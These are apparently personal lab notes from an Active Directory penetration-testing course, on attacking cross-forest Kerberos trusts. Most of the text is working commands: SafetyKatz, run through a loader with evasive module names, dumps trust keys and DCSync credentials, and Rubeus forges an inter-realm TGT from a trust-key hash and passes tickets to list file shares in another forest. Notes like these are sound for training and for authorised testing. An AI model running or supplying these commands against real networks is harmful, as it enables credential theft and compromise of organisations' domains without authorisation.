### Abuse

> [!NOTE] **IMPORTANT**
>**Unfortunately, we can only access resources that are explicitly shared by the trusting forest. This is due to the forest level being the security boundry and not the domain. Along with this the external forest DC will strip the `sIDHistory` of your ticket to make sure privileges aren't escalated**
>a
>The only way to enumerate resources on machines within a different forest is by forging a TGT for **each** machine (`cifs/ext-admin1.eurocorp.local`) then using `net view` to view whats shared

If you have Domain or Enterprise Admin in one forest you can pretty much automatically compromise an external forest.

Obtain Trust Key (as DA)
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-trust /patch"

C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\ecorp$" "exit"

C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::lsa /patch"
```

Forge an inter-realm TGT
```powershell
.\Loader -path .\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:2aa239e4140375cf03be3d57f889278e /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```

| Option              | Description                                                   |
| ------------------- | ------------------------------------------------------------- |
| silver              | Name of the module                                            |
| /rc4                | NTLM hash of the trust key                                    |
| /sid                | SID of the current domain                                     |
| /sids               | SID of the **enterprise admins** group of the external Forest |
| /ldap               | Retrieve PAC information from the current domain DC           |
| /user:Administrator | Username for which the TGT is generated                       |
| /nowrap             | No newlines in the output                                     |

Use forged ticket to view possible file shares
```powershell
.\Loader -path .\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt /ticket:<FORGED TICKET>
```

Test - **THIS WILL HAVE TO BE DONE ON ALL MACHINES IN AN EXTERNAL FOREST**
```powershell
net view \\eurocorp-dc.eurocorp.LOCAL

dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

> [!NOTE] **NOTE**
> Same as cross domain trust functionality, where the trusting DC only checks if it can decrypt the ticket using the **Trust Key** that both DCs have

![[Pasted image 20250519115856.png]]
### Cross Forest Kerberos Functionality
![[Pasted image 20250519115832.png]]